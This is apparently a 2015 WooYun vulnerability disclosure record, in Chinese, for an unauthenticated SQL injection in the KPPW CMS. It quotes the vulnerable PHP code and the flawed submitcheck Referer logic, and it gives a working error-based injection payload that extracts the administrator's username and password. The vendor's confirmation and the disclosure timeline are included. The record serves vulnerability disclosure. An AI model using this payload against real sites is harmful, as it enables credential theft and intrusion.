{"id": 84795, "wybug_id": "wooyun-2015-0141693", "wybug_title": "kppw最新版本 前台无需登入sql注入。", "wybug_corp": "keke.com", "wybug_author": "%270x5c", "wybug_date": "2015-09-17 17:46", "wybug_open_date": "2015-12-17 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： rt 详细说明：  /www/control/select.php\nif (kekezu::submitcheck(isset($formhash))) {\t$arrSelectPeople = db_factory::query('select uid from ' . TABLEPRE . 'witkey_task_work where  task_id=' . $task_id);\t$task_info = db_factory::query('select * from ' . TABLEPRE . 'witkey_task where  task_id=' . $task_id);\t$hongbaoSum = $task_info[0]['task_cash'];\tshuffle($cbk);.........\n该cms采用伪全局。task_id没有过滤带入了sql语句。看到submitcheck\nstatic function submitcheck($var, $return_json = false) {\t\tglobal $_lang;\t\tglobal $_K, $kekezu;\t\tif (! empty ( $var ) && $_SERVER ['REQUEST_METHOD'] == 'POST') {\t\t\tif ((empty ( $_SERVER ['HTTP_REFERER'] ) || preg_replace ( \"/https?:\\/\\/([^\\:\\/]+).*/i\", \"\\\\1\", $_SERVER ['HTTP_REFERER'] ) == preg_replace ( \"/([^\\:]+).*/\", \"\\\\1\", $_SERVER ['HTTP_HOST'] )) && $var == FORMHASH) {\t\t\t\treturn true;\t\t\t} elseif ($return_json == true) {\t\t\t\treturn false;\t\t\t} elseif ($_K [inajax]) {\t\t\t\tkekezu::show_msg ( $_lang ['operate_error'], \"\", 5, $_lang ['repeat_form_submit'], 'alert_error' );\t\t\t} else {\t\t\t\tkekezu::show_msg ( $_lang ['operate_error'], \"index.php\", 30, $_lang ['illegal_or_repeat_submit'], 'alert_error' );\t\t\t}\t\t} else {\t\t\treturn false;\t\t}\t}\n可以看到 formhash 不为空且HTTP_REFERER 为空时 就会返回true.http://localhost:801/index.php?do=selectpost数据\nformhash=1&task_id=1 and extractvalue(1,concat(0x5c,(select concat(username,0x5c,password) from keke_witkey_member where uid=1)))\n即可报错出管理员账号密码。\n\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 %270x5c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-09-18 10:48 厂商回复： 感谢关注，技术已跟进处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}